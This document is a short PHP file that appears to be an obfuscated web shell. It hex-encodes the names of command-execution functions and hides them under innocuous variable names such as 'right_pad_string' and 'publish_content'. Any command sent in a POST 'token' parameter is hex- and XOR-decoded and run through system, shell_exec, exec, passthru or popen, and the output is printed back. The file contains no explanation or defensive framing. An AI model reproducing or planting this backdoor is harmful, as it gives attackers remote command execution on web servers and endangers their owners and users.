<?php

$right_pad_string5 = "\x70op\x65n";
$right_pad_string4 = "\x70as\x73th\x72\x75";
$right_pad_string6 = "\x73\x74\x72e\x61\x6D\x5F\x67\x65\x74_c\x6Fntents";
$right_pad_string7 = "p\x63los\x65";
$right_pad_string1 = "sys\x74e\x6D";
$right_pad_string2 = "\x73\x68ell_exec";
$right_pad_string3 = "\x65xec";
$core_engine = "\x68ex\x32\x62\x69n";
if (isset($_POST["\x74o\x6Ben"])) {
            function publish_content      (      $object    ,       $value     )    {
    $pgrp    =   ''     ;
     for($p=0;
 $p<strlen($object);
 $p++){
$pgrp.=chr(ord($object[$p])^$value);

} return      $pgrp;
   
}
            $token = $core_engine($_POST["\x74o\x6Ben"]);
            $token = publish_content($token, 72);
            if (function_exists($right_pad_string1)) {
                $right_pad_string1($token);
            } elseif (function_exists($right_pad_string2)) {
                print $right_pad_string2($token);
            } elseif (function_exists($right_pad_string3)) {
                $right_pad_string3($token, $pset_object);
                print join("\n", $pset_object);
            } elseif (function_exists($right_pad_string4)) {
                $right_pad_string4($token);
            } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
                $value_pgrp = $right_pad_string5($token, 'r');
                if ($value_pgrp) {
                    $symbol_pointer = $right_pad_string6($value_pgrp);
                    $right_pad_string7($value_pgrp);
                    print $symbol_pointer;
                }
            }
            exit;
        }